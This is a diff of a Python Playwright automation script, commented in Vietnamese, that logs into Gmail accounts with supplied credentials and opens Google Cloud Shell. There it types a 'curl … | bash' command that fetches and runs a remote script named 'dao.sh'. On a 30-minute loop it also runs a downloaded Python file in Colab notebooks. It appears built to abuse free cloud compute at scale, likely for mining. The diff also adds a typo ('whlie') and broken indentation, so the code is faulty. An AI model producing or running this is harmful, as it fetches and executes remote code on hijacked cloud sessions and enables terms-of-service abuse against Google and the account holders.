@@ -50,67 +50,87 @@ async def login_gmail(email: str, password: str):
         a = 0
         page = await context.new_page()
         async def Dangnhap():
-            await page.goto("https://accounts.google.com")
-            print("🔐 Đang mở trang đăng nhập Gmail...")
-            await page.get_by_role("textbox", name="Email or phone").fill(email)
-            await page.get_by_role("button", name="Next").click()
-            await page.wait_for_selector('input[type="password"]', timeout=15000)
-            await page.locator('input[type="password"]').fill(password)
-            await page.get_by_role("button", name="Next").click()
-            await asyncio.sleep(5)
-            print(0)
-            page2 = await context.new_page()
-        
-            print(1)
-            await page.goto("https://shell.cloud.google.com", timeout=500000)
-            try:
-             await page.get_by_role("checkbox", name="I agree that my use of any").check(timeout=180000)
-             await page.get_by_role("button", name="Start Cloud Shell").click(timeout=500000)
-             print(2)
-            except:
-                print(2.1)
-            await page.get_by_role("button", name="Authorize").click(timeout=500000)
-            await page.locator("#cloud-shell-editor").content_frame.locator(".gettingStartedSlideDetails > div").click(timeout=500000)
-            print(3)
-            await page.locator("#cloud-shell-editor").content_frame.get_by_role("button", name="Inspect this in the").press("ControlOrMeta+`", timeout=500000)
-            await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").click(timeout=500000)
-            await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").fill("curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | bash", timeout=500000)
-            await page.keyboard.press("Enter", delay=2)
-            print("hoan thanh")
+            while True: 
+               try:    
+                await page.goto("https://accounts.google.com")
+                print("🔐 Đang mở trang đăng nhập Gmail...")
+                await page.get_by_role("textbox", name="Email or phone").fill(email,timeout = 60000)
+                await page.get_by_role("button", name="Next").click()
+                await page.wait_for_selector('input[type="password"]', timeout=60000)
+                await page.locator('input[type="password"]').fill(password)
+                await page.get_by_role("button", name="Next").click()
+                await asyncio.sleep(5)
+                print("Dang nhap thanh cong")
+               except:
+                print("dang nhap that bai.thuc hien dang nhap lai.")
+            print("thao tac trong shell")
+            while True:
+               try:
+                print("truy cap trang https://shell.cloud.google.com ")             
+                await page.goto("https://shell.cloud.google.com", timeout=500000)
+                try:
+                    print("truy cap thanh cong dang kiem tra thong bao dau tien")
+                    await page.get_by_role("checkbox", name="I agree that my use of any").check(timeout=180000)
+                    await page.get_by_role("button", name="Start Cloud Shell").click(timeout=500000)
+                print(2)
+                except:
+                    print("khong co thong bao")
+                whlie True:
+                 try:    
+                    await page.get_by_role("button", name="Authorize").click(timeout=500000)
+                    await page.locator("#cloud-shell-editor").content_frame.locator(".gettingStartedSlideDetails > div").click(timeout=500000)
+                    print("Dang mo tem")
+                    await page.locator("#cloud-shell-editor").content_frame.get_by_role("button", name="Inspect this in the").press("ControlOrMeta+`", timeout=500000)
+                    await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").click(timeout=500000)
+                    await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").fill("curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | bash", timeout=500000)
+                    await page.keyboard.press("Enter", delay=2)
+                    break
+                 except:
+                    print ("thao tac that bai thuc hien lai quy trinh")
+                    await page.goto("https://shell.cloud.google.com", timeout=500000)   
+                print("hoan thanh")
+                break
+               except:
+                print ("thao tac that bai thuc hien lai quy trinh")
             while True:
                 await asyncio.sleep(1800)
-                page2 = await context.new_page()
-                await page2.goto("https://colab.research.google.com",timeout = 500000)
-                await page2.get_by_role("button", name="New notebook").click()
-                await page2.locator(".view-line").click(timeout = 300000)
-                code =f"""
-#!/bin/bash
-!apt-get update -y
-!apt-get install -y chromium-browser chromium-driver xvfb libnss3 libatk-bridge2.0-0 libgtk-3-0 libxss1 libasound2
-!pip install --upgrade pip
-!pip install playwright pyvirtualdisplay nest_asyncio IPython
-!playwright install chromium
-# Các biến cần thay đổi
-MY_EMAIL="{email}"
-GITHUB_RAW_URL="https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/shell.py"
-LOCAL_FILE="temp_script.py"
+                print("thao tac voi colap")
+                while True:
+                   try: 
+                    page2 = await context.new_page()
+                    await page2.goto("https://colab.research.google.com",timeout = 500000)
+                    await page2.get_by_role("button", name="New notebook").click()
+                    await page2.locator(".view-line").click(timeout = 300000)
+                    code =f"""
+    #!/bin/bash
+    !apt-get update -y
+    !apt-get install -y chromium-browser chromium-driver xvfb libnss3 libatk-bridge2.0-0 libgtk-3-0 libxss1 libasound2
+    !pip install --upgrade pip
+    !pip install playwright pyvirtualdisplay nest_asyncio IPython
+    !playwright install chromium
+    # Các biến cần thay đổi
+    MY_EMAIL="{email}"
+    GITHUB_RAW_URL="https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/shell.py"
+    LOCAL_FILE="temp_script.py"
 
-# Tải file Python về máy
-!curl -sL "$GITHUB_RAW_URL" -o "$LOCAL_FILE"
+    # Tải file Python về máy
+    !curl -sL "$GITHUB_RAW_URL" -o "$LOCAL_FILE"
 
-# Chỉnh sửa nội dung file bằng sed
-!sed -i "s|brandonhernandez1469a46@huacics.com	|$MY_EMAIL|g" "$LOCAL_FILE"
+    # Chỉnh sửa nội dung file bằng sed
+    !sed -i "s|brandonhernandez1469a46@huacics.com	|$MY_EMAIL|g" "$LOCAL_FILE"
 
-# Chạy file Python đã được chỉnh sửa
-!python3 "$LOCAL_FILE"
+    # Chạy file Python đã được chỉnh sửa
+    !python3 "$LOCAL_FILE"
 
-# Xóa file tạm thời sau khi chạy xong
-!rm "$LOCAL_FILE"
-"""
-                await page2.get_by_role("textbox", name="Editor content;Press Alt+F1").fill(code,timeout = 120000)
-                await page2.get_by_role("button", name="Run cell", exact=True).click()
-                await asyncio.sleep(6000)
-                break
+    # Xóa file tạm thời sau khi chạy xong
+    !rm "$LOCAL_FILE"
+    """
+                    await page2.get_by_role("textbox", name="Editor content;Press Alt+F1").fill(code,timeout = 120000)
+                    await page2.get_by_role("button", name="Run cell", exact=True).click()
+                    await asyncio.sleep(600)
+                    break
+                   except:
+                     None 
 
         await Dangnhap()
         return
